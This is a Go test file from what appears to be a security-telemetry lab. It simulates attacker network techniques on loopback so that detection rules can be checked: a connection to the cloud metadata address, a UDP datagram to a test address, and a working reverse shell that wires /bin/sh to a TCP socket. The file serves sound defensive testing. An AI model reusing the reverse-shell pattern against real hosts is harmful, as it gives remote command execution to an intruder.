package network

import (
	"fmt"
	"github.com/michaellong/telemetry-lab/ttp-composite/linux/go/coverage/internal/fixture"
	"io"
	"net"
	"os/exec"
	"time"
)

func Metadata() {
	ln, err := net.Listen("tcp4", "169.254.169.254:80")
	fixture.Must(err)
	defer ln.Close()
	conn, err := net.DialTimeout("tcp4", ln.Addr().String(), 3*time.Second)
	fixture.Must(err)
	defer conn.Close()
	peer, err := ln.Accept()
	fixture.Must(err)
	defer peer.Close()
	fixture.Must(conn.SetDeadline(time.Now().Add(3 * time.Second)))
	fixture.Must(peer.SetDeadline(time.Now().Add(3 * time.Second)))
	n, err := io.WriteString(conn, fixture.Payload)
	fixture.Must(err)
	fixture.Check(n == len(fixture.Payload), "request length")
	data := make([]byte, len(fixture.Payload))
	_, err = io.ReadFull(peer, data)
	fixture.Must(err)
	fixture.Check(string(data) == fixture.Payload, "request contents")
	n, err = peer.Write(data)
	fixture.Must(err)
	fixture.Check(n == len(data), "reply length")
	_, err = io.ReadFull(conn, data)
	fixture.Must(err)
	fixture.Check(string(data) == fixture.Payload, "reply contents")
}
func UDP() {
	addr, err := net.ResolveUDPAddr("udp4", "198.18.0.1:44445")
	fixture.Must(err)
	peer, err := net.ListenUDP("udp4", addr)
	fixture.Must(err)
	defer peer.Close()
	conn, err := net.DialUDP("udp4", nil, addr)
	fixture.Must(err)
	defer conn.Close()
	fixture.Must(peer.SetDeadline(time.Now().Add(3 * time.Second)))
	n, err := conn.Write([]byte(fixture.Payload))
	fixture.Must(err)
	fixture.Check(n == len(fixture.Payload), "datagram sent")
	data := make([]byte, len(fixture.Payload)+1)
	n, _, err = peer.ReadFromUDP(data)
	fixture.Must(err)
	fixture.Check(string(data[:n]) == fixture.Payload, "datagram received")
}
func ReverseShell() {
	ln, err := net.Listen("tcp4", "127.0.0.1:4444")
	fixture.Must(err)
	defer ln.Close()
	done := make(chan error, 1)
	go func() {
		peer, err := ln.Accept()
		if err != nil {
			done <- err
			return
		}
		defer peer.Close()
		if err = peer.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
			done <- err
			return
		}
		_, err = io.WriteString(peer, "printf 'SHELL_OK\\n'; exit\n")
		if err == nil {
			err = peer.(*net.TCPConn).CloseWrite()
		}
		if err != nil {
			done <- err
			return
		}
		data, err := io.ReadAll(peer)
		if err == nil && string(data) != "SHELL_OK\n" {
			err = fmt.Errorf("unexpected shell response %q", data)
		}
		done <- err
	}()
	conn, err := net.DialTimeout("tcp4", ln.Addr().String(), 3*time.Second)
	fixture.Must(err)
	cmd := exec.Command("/bin/sh")
	cmd.Args[0] = "sh"
	// net.Conn is not *os.File: os/exec performs a pipe relay. Preserve this
	// standard-library mechanism, even if the socket-dup target rule misses.
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	err = cmd.Run()
	fixture.Must(conn.Close())
	fixture.Must(err)
	fixture.Must(<-done)
}
